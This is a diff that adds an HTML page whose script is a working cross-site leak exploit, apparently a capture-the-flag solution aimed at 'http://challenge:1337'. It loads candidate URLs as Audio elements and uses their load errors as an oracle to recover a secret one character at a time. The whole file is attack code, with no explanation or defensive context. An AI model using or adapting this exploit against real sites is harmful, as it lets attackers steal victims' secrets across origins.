@@ -1,0 +1,28 @@
+<script>
+const target = 'http://challenge:1337'
+
+async function leak(prefix){
+	let r,interval,cs
+	r = await fetch(`/chunks.json?prefix=${btoa(prefix)}`)
+	r = await r.json()
+	cs = r.cs
+
+	for(let c in cs){
+		a=new Audio(`${target}/?p=${r['prev']+cs[c]}`)
+		a.onerror = _=>delete cs[c]
+	}
+
+	interval = setInterval(()=>{
+		let cans = Object.keys(cs)
+		if(cans.length == 1){
+			clearInterval(interval)
+			document.body.innerHTML = 'progress: '+prefix+cans[0]
+			leak(prefix+cans[0])
+		} else {
+			document.body.innerHTML = `Found: "${prefix}" possiblities: ${cans} `
+		}
+	},100)
+}
+
+leak('')
+</script>
